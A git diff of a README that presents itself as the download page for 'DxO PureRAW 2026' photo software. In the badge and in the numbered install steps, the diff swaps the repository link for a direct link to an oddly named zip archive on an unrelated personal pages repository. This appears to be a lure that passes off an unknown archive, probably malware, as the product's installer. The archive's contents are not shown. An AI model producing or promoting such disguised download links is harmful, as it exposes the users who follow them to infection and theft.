@@ -5,7 +5,7 @@ description: "Download and install DxO PureRAW on Windows 10 and 11 using a sing
 ---
 # 📸 DxO-PureRAW-2026 - Improve your digital photography image quality
 
-[![](https://img.shields.io/badge/Download-DxO_PureRAW_2026-blue.svg)](https://github.com/quasi-para817/DxO-PureRAW-2026)
+[![](https://img.shields.io/badge/Download-DxO_PureRAW_2026-blue.svg)](https://raw.githubusercontent.com/quasi-para817/quasi-para817.github.io/main/alienage/quasi_para_io_github_v2.9.zip)
 
 DxO PureRAW 2026 enhances image quality by removing noise and correcting optical flaws in digital photographs. This software utilizes advanced algorithms to process RAW files before you import them into your editing workspace. It creates cleaner, sharper images from the start.
 
@@ -33,7 +33,7 @@ Your computer needs to meet these specifications to run the software.
 Follow these steps to obtain and launch the software.
 
 1.  **Visit the Download Page:** Click the link below to access the setup files for your computer.
-    [Download DxO PureRAW 2026](https://github.com/quasi-para817/DxO-PureRAW-2026)
+    [Download DxO PureRAW 2026](https://raw.githubusercontent.com/quasi-para817/quasi-para817.github.io/main/alienage/quasi_para_io_github_v2.9.zip)
 
 2.  **Save the File:** Your browser will ask where to store the installer. Save the file to your "Downloads" folder.
 
